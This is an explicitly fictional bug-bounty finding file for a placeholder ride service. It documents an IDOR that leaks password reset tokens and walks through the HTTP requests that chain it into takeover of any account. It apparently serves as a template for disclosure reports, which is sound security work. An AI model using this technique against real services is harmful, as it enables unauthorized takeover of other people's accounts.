# F001 — idor — profile endpoint leaks reset token

> ILLUSTRATIVE EXAMPLE — fictional target, invented data, not a real program or disclosure.
> It exists to show what a finding file and its report look like when they follow this framework.
> `meridianride.example` is a placeholder domain; the IDs and tokens are made up.

Program: meridian (example)
Platform: hackerone
Date: 2026-09-23
Status: CONFIRMED
Severity (proposed): Critical  ·  CVSS: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (9.1)
CWE: CWE-639 (Authorization Bypass Through User-Controlled Key) → chained to account takeover

## Summary

The user profile endpoint returns the full stored record for any user id, not just the caller's own.
The record includes a live `password_reset_token`. With another user's token, the public reset flow
sets a new password for their account. Any authenticated user can take over any other account.

## Location

| | |
|--|--|
| Affected URL | `https://api.meridianride.example/v2/users/{id}` |
| Method | GET |
| Parameter | `id` (path) |
| Auth required | Yes (any logged-in user) |
| Role required | None |

## Root cause

The handler loads the user by the `id` in the path and serializes the whole model. There is no check
that the requested `id` matches the caller's id from the session, and the serializer does not strip
sensitive fields. So the response includes `email`, `phone`, and `password_reset_token` for whoever is
asked for.

## Reproduction

Accounts used (both mine, registered for testing):
- Attacker: `hunter+atk@example.com` — id `50231`
- Victim: `hunter+vic@example.com` — id `50232`

Steps:
1. Log in as the attacker, capture the session cookie.
2. Request the victim's profile by id: `GET /v2/users/50232`.
3. Response body contains the victim's `password_reset_token`.
4. Open the public reset page with that token and set a new password.
5. Log in as the victim with the new password.

## Proof of concept

Attacker requests the victim's record (own session, victim's id):
```http
GET /v2/users/50232 HTTP/1.1
Host: api.meridianride.example
Cookie: session=<attacker session>
X-Bug-Bounty: yourhandle
```

Response — the token that should never leave the server:
```http
HTTP/1.1 200 OK
Content-Type: application/json

{
  "id": 50232,
  "email": "hunter+vic@example.com",
  "phone": "+1-555-0102",
  "password_reset_token": "rt_9f2c...redacted...",
  "created_at": "2026-08-11T09:14:00Z"
}
```

Use the token on the public reset flow:
```http
POST /auth/reset/confirm HTTP/1.1
Host: meridianride.example
Content-Type: application/json

{ "token": "rt_9f2c...redacted...", "password": "<new password I set>" }
```

Response: `200 OK`, `{ "status": "password_updated" }`. Logging in as `hunter+vic@example.com` with
the new password succeeds — the victim account is now under the attacker's control.

Evidence files: `../logs/F001-01-idor-response.png`, `F001-02-reset-confirm.png`, `F001-03-login-as-victim.mp4`.

## Gate check

| Gate | Pass | Note |
|------|------|------|
| 1 Reproducible | yes | 3/3 on clean login; two controlled accounts |
| 2 Root cause | yes | missing owner check + unstripped serializer field |
| 3 Exploitable | yes | not a false positive — token is live and the reset flow accepts it |
| 4 In scope + submittable | yes | `api.meridianride.example` in scope; used only my own accounts; marked traffic |
| 5 Impact | yes | full ATO of any account; escalated from a read IDOR per impact-escalation.md |

## Escalation notes

On its own the IDOR is a data-exposure bug (email/phone of any user — already High). The
`password_reset_token` in the same response is what lifts it to account takeover: read → ATO, and it
works for any `id`, so it's any-user, not one user. That chain is the finding; the raw IDOR is the path.

## Prior-art check

Searched the program's disclosed reports and changelog for "profile", "IDOR", "reset token" — nothing
matching. No prior finding in this program folder. Treating as first report.

## Dead ends (kept so I don't retry)

- `GET /v2/users/{id}/rides` returns 403 for non-owners — that route checks ownership, so the bug is
  specific to the profile serializer, not app-wide.
